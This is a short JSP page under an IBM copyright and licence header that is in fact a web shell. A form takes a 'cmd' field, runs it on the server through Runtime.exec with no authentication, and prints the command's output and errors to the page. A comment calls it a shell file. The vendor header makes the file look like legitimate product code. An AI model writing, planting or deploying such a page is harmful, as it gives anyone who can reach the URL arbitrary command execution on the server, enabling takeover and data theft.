<!--
/********************************************************************
*  Licensed Materials - Property of IBM
*  
*  (c) Copyright IBM Corp.  2007 All Rights Reserved
*  
*  US Government Users Restricted Rights - Use, duplication or
*  disclosure restricted by GSA ADP Schedule Contract with
*  IBM Corp.
********************************************************************/
-->
<%@ page language="java" import="java.util.*" pageEncoding="UTF-8"%>
<%@page import="java.io.BufferedWriter"%>
<%@page import="java.io.File"%>
<%@page import="java.io.FileWriter"%>
<%@page import="java.io.InputStreamReader"%>
<%@page import="java.io.LineNumberReader"%>
<%@page import="java.lang.*"%>


<html>
<head>



<meta http-equiv="Content-Type" content="text/html; charset=UTF-8">

</head>



<body>
	<form id="form1" name="form1" method="post"
		action="<%=request.getContextPath() %>/custom/cmd.jsp">
		<p>Command:</p>
		<input id="cmd" name="cmd" type="text" /> <input type="submit"
			value="submit" />
	</form>
<br><hr>
	<pre>
<%

		if(request.getParameter("cmd")!=null && request.getParameter("cmd").length()>0){
         String cmd = (String)request.getParameter("cmd");
	      Runtime rt = Runtime.getRuntime();
	      Process ppp = rt.exec(cmd);  //授权该shell文件可以执行
	      ppp.waitFor();
		 InputStreamReader ir = new InputStreamReader(ppp.getInputStream());
	      LineNumberReader input = new LineNumberReader(ir);

	      String line;
		   out.println("<pre>");
	      while ((line = input.readLine()) != null){
			 
	    	  out.println(line);
			  
	      }

	      //error
	      ir = new InputStreamReader(ppp.getErrorStream());
	      input = new LineNumberReader(ir);
	      while ((line = input.readLine()) != null){
			  	    	  out.println(line);
	      }

	      ppp.waitFor();
		  
		  }

%>

</pre>

</body>